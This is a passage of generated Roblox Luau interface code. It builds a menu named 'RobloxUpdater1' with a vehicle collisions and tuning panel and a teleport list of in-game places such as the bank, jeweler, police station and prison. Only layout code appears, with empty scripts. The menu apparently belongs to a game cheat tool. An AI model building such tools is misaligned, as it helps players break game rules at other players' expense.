
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.TextLabel 1 \\ --
UI["14d"] = Instance.new("TextLabel", UI["14a"])
UI["14d"]["TextWrapped"] = true
UI["14d"]["BorderSizePixel"] = 0
UI["14d"]["TextTransparency"] = 0.32
UI["14d"]["TextScaled"] = true
UI["14d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["14d"]["TextSize"] = 74
UI["14d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["14d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["14d"]["BackgroundTransparency"] = 1
UI["14d"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["14d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["14d"]["Text"] = [[set your tuning level]]
UI["14d"]["Name"] = [[TextLabel 1]]
UI["14d"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.animation \\ --
UI["14e"] = Instance.new("LocalScript", UI["14a"])
UI["14e"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.collission \\ --
UI["14f"] = Instance.new("LocalScript", UI["14a"])
UI["14f"]["Name"] = [[collission]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.UIGradient \\ --
UI["150"] = Instance.new("UIGradient", UI["14a"])
UI["150"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport \\ --
UI["151"] = Instance.new("Frame", UI["e"])
UI["151"]["Visible"] = false
UI["151"]["BorderSizePixel"] = 0
UI["151"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["151"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["151"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["151"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["151"]["Name"] = [[Teleport]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest \\ --
UI["152"] = Instance.new("TextButton", UI["151"])
UI["152"]["BorderSizePixel"] = 0
UI["152"]["TextSize"] = 37
UI["152"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["152"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34)
UI["152"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["152"]["ZIndex"] = 5
UI["152"]["Size"] = UDim2.new(0, 246, 0, 37)
UI["152"]["BackgroundTransparency"] = 1
UI["152"]["Name"] = [[Nearest]]
UI["152"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["152"]["Text"] = [[Nearest Dealer]]
UI["152"]["Position"] = UDim2.new(0.43263, 0, 0.84256, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.animation \\ --
UI["153"] = Instance.new("LocalScript", UI["152"])
UI["153"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.UICorner \\ --
UI["154"] = Instance.new("UICorner", UI["152"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.UIGradient \\ --
UI["155"] = Instance.new("UIGradient", UI["152"])
UI["155"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 5)),ColorSequenceKeypoint.new(0.774, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.LocalScript \\ --
UI["156"] = Instance.new("LocalScript", UI["152"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.UIGradient \\ --
UI["157"] = Instance.new("UIGradient", UI["151"])
UI["157"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame \\ --
UI["158"] = Instance.new("ScrollingFrame", UI["151"])
UI["158"]["Active"] = true
UI["158"]["BorderSizePixel"] = 0
UI["158"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["158"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["158"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.Always
UI["158"]["Size"] = UDim2.new(0, 253, 0, 166)
UI["158"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["158"]["Position"] = UDim2.new(0.43018, 0, 0.20784, 0)
UI["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["158"]["ScrollBarThickness"] = 5
UI["158"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Jewelry \\ --
UI["159"] = Instance.new("TextButton", UI["158"])
UI["159"]["BorderSizePixel"] = 0
UI["159"]["TextSize"] = 37
UI["159"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["159"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["159"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["159"]["Size"] = UDim2.new(0, 253, 0, 43)
UI["159"]["BackgroundTransparency"] = 1
UI["159"]["Name"] = [[Jewelry]]
UI["159"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["159"]["Text"] = [[Jeweler]]
UI["159"]["Position"] = UDim2.new(-0.00756, 0, -0.00088, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Jewelry.UIGradient \\ --
UI["15a"] = Instance.new("UIGradient", UI["159"])
UI["15a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Night Club \\ --
UI["15b"] = Instance.new("TextButton", UI["158"])
UI["15b"]["BorderSizePixel"] = 0
UI["15b"]["TextSize"] = 37
UI["15b"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["15b"]["Size"] = UDim2.new(0, 253, 0, 43)
UI["15b"]["BackgroundTransparency"] = 1
UI["15b"]["Name"] = [[Night Club]]
UI["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["15b"]["Text"] = [[Erwins P-Club ]]
UI["15b"]["Position"] = UDim2.new(0.00034, 0, 0.07959, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Night Club.UIGradient \\ --
UI["15c"] = Instance.new("UIGradient", UI["15b"])
UI["15c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Gas n Go Fuel \\ --
UI["15d"] = Instance.new("TextButton", UI["158"])
UI["15d"]["BorderSizePixel"] = 0
UI["15d"]["TextSize"] = 37
UI["15d"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["15d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["15d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["15d"]["Size"] = UDim2.new(0, 252, 0, 43)
UI["15d"]["BackgroundTransparency"] = 1
UI["15d"]["Name"] = [[Gas n Go Fuel]]
UI["15d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["15d"]["Text"] = [[Gas-N-Go-Tank]]
UI["15d"]["Position"] = UDim2.new(0.0043, 0, 0.30907, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Gas n Go Fuel.UIGradient \\ --
UI["15e"] = Instance.new("UIGradient", UI["15d"])
UI["15e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Ares Fuel \\ --
UI["15f"] = Instance.new("TextButton", UI["158"])
UI["15f"]["BorderSizePixel"] = 0
UI["15f"]["TextSize"] = 37
UI["15f"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["15f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["15f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["15f"]["Size"] = UDim2.new(0, 252, 0, 43)
UI["15f"]["BackgroundTransparency"] = 1
UI["15f"]["Name"] = [[Ares Fuel]]
UI["15f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["15f"]["Text"] = [[Ares Tank]]
UI["15f"]["Position"] = UDim2.new(-0.00361, 0, 0.23015, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Ares Fuel.UIGradient \\ --
UI["160"] = Instance.new("UIGradient", UI["15f"])
UI["160"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Bank \\ --
UI["161"] = Instance.new("TextButton", UI["158"])
UI["161"]["BorderSizePixel"] = 0
UI["161"]["TextSize"] = 37
UI["161"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["161"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["161"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["161"]["Size"] = UDim2.new(0, 252, 0, 42)
UI["161"]["BackgroundTransparency"] = 1
UI["161"]["Name"] = [[Bank]]
UI["161"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["161"]["Text"] = [[Bank]]
UI["161"]["Position"] = UDim2.new(0.0043, 0, 0.15315, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Bank.UIGradient \\ --
UI["162"] = Instance.new("UIGradient", UI["161"])
UI["162"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Green Container \\ --
UI["163"] = Instance.new("TextButton", UI["158"])
UI["163"]["BorderSizePixel"] = 0
UI["163"]["TextSize"] = 37
UI["163"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["163"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["163"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["163"]["Size"] = UDim2.new(0, 250, 0, 43)
UI["163"]["BackgroundTransparency"] = 1
UI["163"]["Name"] = [[Green Container]]
UI["163"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["163"]["Text"] = [[Container 2]]
UI["163"]["Position"] = UDim2.new(-0.00188, 0, 0.85047, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Green Container.UIGradient \\ --
UI["164"] = Instance.new("UIGradient", UI["163"])
UI["164"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Yellow Container \\ --
UI["165"] = Instance.new("TextButton", UI["158"])
UI["165"]["BorderSizePixel"] = 0
UI["165"]["TextSize"] = 37
UI["165"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["165"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["165"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["165"]["Size"] = UDim2.new(0, 250, 0, 43)
UI["165"]["BackgroundTransparency"] = 1
UI["165"]["Name"] = [[Yellow Container]]
UI["165"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["165"]["Text"] = [[Container 1]]
UI["165"]["Position"] = UDim2.new(-0.00188, 0, 0.74377, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Yellow Container.UIGradient \\ --
UI["166"] = Instance.new("UIGradient", UI["165"])
UI["166"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Food Shop \\ --
UI["167"] = Instance.new("TextButton", UI["158"])
UI["167"]["BorderSizePixel"] = 0
UI["167"]["TextSize"] = 37
UI["167"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["167"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["167"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["167"]["Size"] = UDim2.new(0, 250, 0, 43)
UI["167"]["BackgroundTransparency"] = 1
UI["167"]["Name"] = [[Food Shop]]
UI["167"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["167"]["Text"] = [[Farm Shop]]
UI["167"]["Position"] = UDim2.new(0.00603, 0, 0.63798, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Food Shop.UIGradient \\ --
UI["168"] = Instance.new("UIGradient", UI["167"])
UI["168"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Clothing Store \\ --
UI["169"] = Instance.new("TextButton", UI["158"])
UI["169"]["BorderSizePixel"] = 0
UI["169"]["TextSize"] = 37
UI["169"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["169"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["169"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["169"]["Size"] = UDim2.new(0, 250, 0, 43)
UI["169"]["BackgroundTransparency"] = 1
UI["169"]["Name"] = [[Clothing Store]]
UI["169"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["169"]["Text"] = [[Clothing store]]
UI["169"]["Position"] = UDim2.new(-0.00188, 0, 0.51865, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Clothing Store.UIGradient \\ --
UI["16a"] = Instance.new("UIGradient", UI["169"])
UI["16a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Ossu Fuel \\ --
UI["16b"] = Instance.new("TextButton", UI["158"])
UI["16b"]["BorderSizePixel"] = 0
UI["16b"]["TextSize"] = 37
UI["16b"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["16b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["16b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["16b"]["Size"] = UDim2.new(0, 250, 0, 43)
UI["16b"]["BackgroundTransparency"] = 1
UI["16b"]["Name"] = [[Ossu Fuel]]
UI["16b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["16b"]["Text"] = [[Osso Tank]]
UI["16b"]["Position"] = UDim2.new(-0.00188, 0, 0.39845, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Ossu Fuel.UIGradient \\ --
UI["16c"] = Instance.new("UIGradient", UI["16b"])
UI["16c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.UIListLayout \\ --
UI["16d"] = Instance.new("UIListLayout", UI["158"])
UI["16d"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["16d"]["Padding"] = UDim.new(0, 2)
UI["16d"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.UIPadding \\ --
UI["16e"] = Instance.new("UIPadding", UI["158"])
UI["16e"]["PaddingTop"] = UDim.new(0, 3)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone \\ --
UI["16f"] = Instance.new("TextButton", UI["151"])
UI["16f"]["BorderSizePixel"] = 0
UI["16f"]["TextSize"] = 37
UI["16f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["16f"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34)
UI["16f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["16f"]["ZIndex"] = 5
UI["16f"]["Size"] = UDim2.new(0, 191, 0, 37)
UI["16f"]["BackgroundTransparency"] = 1
UI["16f"]["Name"] = [[Safe Zone]]
UI["16f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["16f"]["Text"] = [[Safe Zone]]
UI["16f"]["Position"] = UDim2.new(0.00156, 0, 0.84256, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.animation \\ --
UI["170"] = Instance.new("LocalScript", UI["16f"])
UI["170"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.UICorner \\ --
UI["171"] = Instance.new("UICorner", UI["16f"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.UIGradient \\ --
UI["172"] = Instance.new("UIGradient", UI["16f"])
UI["172"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 5)),ColorSequenceKeypoint.new(0.774, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.LocalScript \\ --
UI["173"] = Instance.new("LocalScript", UI["16f"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame \\ --
UI["174"] = Instance.new("ScrollingFrame", UI["151"])
UI["174"]["Active"] = true
UI["174"]["BorderSizePixel"] = 0
UI["174"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["174"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["174"]["Size"] = UDim2.new(0, 189, 0, 166)
UI["174"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["174"]["Position"] = UDim2.new(-0, 0, 0.20784, 0)
UI["174"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["174"]["ScrollBarThickness"] = 5
UI["174"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Police Station \\ --
UI["175"] = Instance.new("TextButton", UI["174"])
UI["175"]["BorderSizePixel"] = 0
UI["175"]["TextSize"] = 37
UI["175"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["175"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["175"]["Size"] = UDim2.new(0, 183, 0, 43)
UI["175"]["BackgroundTransparency"] = 1
UI["175"]["Name"] = [[Police Station]]
UI["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["175"]["Text"] = [[Police]]
UI["175"]["Position"] = UDim2.new(0.01058, 0, 0.00625, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Police Station.UIGradient \\ --
UI["176"] = Instance.new("UIGradient", UI["175"])
UI["176"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Vehicle Garage \\ --
UI["177"] = Instance.new("TextButton", UI["174"])
UI["177"]["TextWrapped"] = true
UI["177"]["BorderSizePixel"] = 0
UI["177"]["TextSize"] = 37
UI["177"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["177"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["177"]["Size"] = UDim2.new(0, 187, 0, 43)
UI["177"]["BackgroundTransparency"] = 1
UI["177"]["Name"] = [[Vehicle Garage]]
UI["177"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["177"]["Text"] = [[Car Tuner]]
UI["177"]["Position"] = UDim2.new(-0.00691, 0, 0.10162, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Vehicle Garage.UIGradient \\ --
UI["178"] = Instance.new("UIGradient", UI["177"])
UI["178"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Tool Shop \\ --
UI["179"] = Instance.new("TextButton", UI["174"])
UI["179"]["BorderSizePixel"] = 0
UI["179"]["TextSize"] = 37
UI["179"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["179"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["179"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["179"]["Size"] = UDim2.new(0, 187, 0, 54)
UI["179"]["BackgroundTransparency"] = 1
UI["179"]["Name"] = [[Tool Shop]]
UI["179"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["179"]["Text"] = [[Tool-Shop]]
UI["179"]["Position"] = UDim2.new(-0.01749, 0, 0.1922, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Tool Shop.UIGradient \\ --
UI["17a"] = Instance.new("UIGradient", UI["179"])
UI["17a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Hospital \\ --
UI["17b"] = Instance.new("TextButton", UI["174"])
UI["17b"]["BorderSizePixel"] = 0
UI["17b"]["TextSize"] = 37
UI["17b"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["17b"]["Size"] = UDim2.new(0, 187, 0, 54)
UI["17b"]["BackgroundTransparency"] = 1
UI["17b"]["Name"] = [[Hospital]]
UI["17b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["17b"]["Text"] = [[Hospital]]
UI["17b"]["Position"] = UDim2.new(0.00367, 0, 0.29271, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Hospital.UIGradient \\ --
UI["17c"] = Instance.new("UIGradient", UI["17b"])
UI["17c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Car Dealership \\ --
UI["17d"] = Instance.new("TextButton", UI["174"])
UI["17d"]["BorderSizePixel"] = 0
UI["17d"]["TextSize"] = 37
UI["17d"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["17d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["17d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["17d"]["Size"] = UDim2.new(0, 185, 0, 54)
UI["17d"]["BackgroundTransparency"] = 1
UI["17d"]["Name"] = [[Car Dealership]]
UI["17d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["17d"]["Text"] = [[Dealership]]
UI["17d"]["Position"] = UDim2.new(0.00896, 0, 0.38884, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Car Dealership.UIGradient \\ --
UI["17e"] = Instance.new("UIGradient", UI["17d"])
UI["17e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Bus Company \\ --
UI["17f"] = Instance.new("TextButton", UI["174"])
UI["17f"]["BorderSizePixel"] = 0
UI["17f"]["TextSize"] = 37
UI["17f"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["17f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["17f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["17f"]["Size"] = UDim2.new(0, 187, 0, 54)
UI["17f"]["BackgroundTransparency"] = 1
UI["17f"]["Name"] = [[Bus Company]]
UI["17f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["17f"]["Text"] = [[Bus Place]]
UI["17f"]["Position"] = UDim2.new(0.00367, 0, 0.49286, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Bus Company.UIGradient \\ --
UI["180"] = Instance.new("UIGradient", UI["17f"])
UI["180"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Truck Company \\ --
UI["181"] = Instance.new("TextButton", UI["174"])
UI["181"]["BorderSizePixel"] = 0
UI["181"]["TextSize"] = 37
UI["181"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["181"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["181"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["181"]["Size"] = UDim2.new(0, 187, 0, 54)
UI["181"]["BackgroundTransparency"] = 1
UI["181"]["Name"] = [[Truck Company]]
UI["181"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["181"]["Text"] = [[Truck Place]]
UI["181"]["Position"] = UDim2.new(0.03012, 0, 0.59499, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Truck Company.UIGradient \\ --
UI["182"] = Instance.new("UIGradient", UI["181"])
UI["182"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Prison \\ --
UI["183"] = Instance.new("TextButton", UI["174"])
UI["183"]["BorderSizePixel"] = 0
UI["183"]["TextSize"] = 37
UI["183"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["183"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["183"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["183"]["Size"] = UDim2.new(0, 187, 0, 54)
